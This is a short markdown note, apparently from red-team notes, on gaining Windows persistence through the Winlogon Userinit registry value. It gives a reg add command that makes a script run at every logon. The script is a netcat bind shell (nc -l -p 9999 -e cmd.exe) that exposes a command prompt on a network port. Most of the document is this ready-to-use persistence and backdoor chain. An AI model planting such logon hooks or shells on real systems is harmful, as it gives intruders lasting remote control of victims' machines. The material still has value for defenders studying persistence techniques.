# Logon Helper

Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.

Winlogon registry keys and value for persistence are:

```
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
```

### Winlogon before add our script

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
```

### Add script to winlogon

```cmd
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit \
 /d C:\Windows\system32\userinit.exe,E:\persistent\driver.cmd /t reg_sz /f
```

##### driver.cmd

```
nc -l -p 9999 -e cmd.exe
```